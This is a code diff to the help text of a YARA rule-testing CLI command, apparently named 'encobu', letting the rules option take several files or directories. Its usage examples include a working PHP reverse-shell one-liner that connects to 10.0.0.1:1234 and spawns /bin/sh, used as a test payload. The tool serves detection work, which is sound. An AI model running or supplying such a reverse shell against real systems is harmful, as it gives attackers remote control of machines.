@@ -169,7 +169,8 @@ class TestSubCommand:
     EPILOG = """
     EXAMPLES:
         encobu test -P "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -r reverse_shell.yara
-        encobu test -F hack.txt -r commands.yara
+        encobu test -F hack.txt -r rules/
+        encobu test -F hack.txt -r rules/port_scan.yar rules/reverse_shell.yar
     """
 
     PAYLOAD_HELP = "The payload you want to test against different yara rules."
@@ -178,8 +179,8 @@ class TestSubCommand:
     FILE_HELP = "The file you want to test against different yara rules."
     FILE_METAVAR = "<FILE>"
 
-    RULES_HELP = "YARA rule to test against different payloads."
-    RULES_METAVAR = "<RULE>"
+    RULES_HELP = "One or more YARA rule files or directories containing rules."
+    RULES_METAVAR = "<RULE_OR_DIR>"
 
     OUTPUT_DIR_HELP = "Path to create the output directory (default: %(default)s)."
     OUTPUT_DIR_METAVAR = "<OUTPUT_DIR>"
